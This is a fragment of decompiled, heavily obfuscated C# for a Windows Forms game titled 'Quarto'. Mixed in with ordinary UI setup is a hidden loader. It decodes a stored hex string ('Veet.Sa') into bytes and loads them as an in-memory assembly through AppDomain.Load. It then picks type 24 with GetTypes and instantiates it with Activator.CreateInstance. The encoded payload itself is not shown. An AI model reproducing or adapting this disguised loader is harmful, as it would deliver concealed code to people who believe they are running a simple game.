					num = (int)((num2 * 2011334283) ^ 0x2E680D47);
					continue;
				case 41u:
					num = (int)(num2 * 2121393513) ^ -1423685841;
					continue;
				case 40u:
					num3++;
					num = ((int)num2 * -883280941) ^ -831716379;
					continue;
				case 39u:
					string_ = Veet.Sa;
					num = ((int)num2 * -772598549) ^ 0x3B53757C;
					continue;
				case 38u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -2058333216) ^ 0x77CC0563;
					continue;
				case 37u:
					num = ((int)num2 * -971133699) ^ -771738143;
					continue;
				case 36u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = ((int)num2 * -546714884) ^ -1209930593;
					continue;
				case 35u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -1263452875) ^ -1279722940;
					continue;
				case 34u:
					label6 = Form1.smethod_57();
					num = ((int)num2 * -2039444007) ^ -1592406750;
					continue;
				case 33u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 737745659;
						num5 = 737745659;
					}
					else
					{
						num4 = 639606155;
						num5 = 639606155;
					}
					num = num4 ^ ((int)num2 * -1945106981);
					continue;
				}
				case 32u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -303449426) ^ 0x3820F561;
					continue;
				case 31u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)((num2 * 1337776550) ^ 0x74E2B440);
					continue;
				case 30u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)((num2 * 402623269) ^ 0x1E26D7B1);
					continue;
				case 29u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)(num2 * 1429021667) ^ -1366490421;
					continue;
				case 28u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -562426082) ^ -55507830;
					continue;
				case 27u:
					num = (int)((num2 * 1371632615) ^ 0x29AFB794);
					continue;
				case 26u:
					num = ((int)num2 * -916045994) ^ 0x4403D613;
					continue;
				case 25u:
					num = (int)(num2 * 925402377) ^ -1153129339;
					continue;
				case 23u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)(num2 * 1475673091) ^ -1721528329;
					continue;
				case 22u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)(num2 * 269183864) ^ -1122898573;
					continue;
				case 21u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)(num2 * 2086678055) ^ -1415282053;
					continue;
				case 20u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)((num2 * 357484390) ^ 0x5D25CB41);
					continue;
				case 19u:
					num = (int)((num2 * 651586458) ^ 0x1EA73D4B);
					continue;
				case 18u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)(num2 * 1532129695) ^ -1167195642;
					continue;
				case 17u:
					Form1.smethod_59((Control)(object)this);
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -2132986028) ^ 0x6663F1AD;
					continue;
				case 16u:
					flag = num3 < 22528;
					num = -1427684080;
					continue;
				case 15u:
					num = -474481262;
					continue;
				case 14u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1280670900) ^ 0x5BB407AB;
					continue;
				case 13u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = (int)((num2 * 1231788336) ^ 0x12AF4A63);
					continue;
				case 12u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)(num2 * 2040894709) ^ -885571930;
					continue;
				case 11u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -2026896096) ^ 0x63616D2E;
					continue;
				case 10u:
					num = (int)((num2 * 1567730387) ^ 0x7EAE7A27);
					continue;
				case 9u:
					num = (int)(num2 * 769055232) ^ -1342118109;
					continue;
				case 8u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -927033185) ^ -117229876;
					continue;
				case 7u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -553110688) ^ 0x33D276D2;
					continue;
				case 6u:
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -573694038) ^ 0x3A39C7B0;
					continue;
				case 5u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)(num2 * 1678032966) ^ -463009123;
					continue;
				case 4u:
					num = (int)(num2 * 1112279387) ^ -1576252601;
					continue;
				case 3u:
					num = ((int)num2 * -991895482) ^ -1460128615;
					continue;
				case 2u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -371714073) ^ 0x53F9DDED;
					continue;
				case 1u:
					num = ((int)num2 * -175388870) ^ 0x5D711948;
					continue;
				case 0u:
					num = ((int)num2 * -1693567163) ^ -965386702;
					continue;
				default:
					return;
				case 24u:
					break;
				case 93u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		while (true)
		{
			int num = -168597432;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC95DCF3Fu) % 3u)
				{
				case 1u:
					goto IL_0009;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0009:
				PerformTable(q);
				num = ((int)num2 * -1747187885) ^ 0x5B20739;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 374681017;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1C698A92u) % 4u)
				{
				case 3u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = ((int)num2 * -238309389) ^ 0x45B957B7;
					continue;
				case 0u:
					num = ((int)num2 * -739569020) ^ 0x347F80BB;
					continue;
				case 2u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
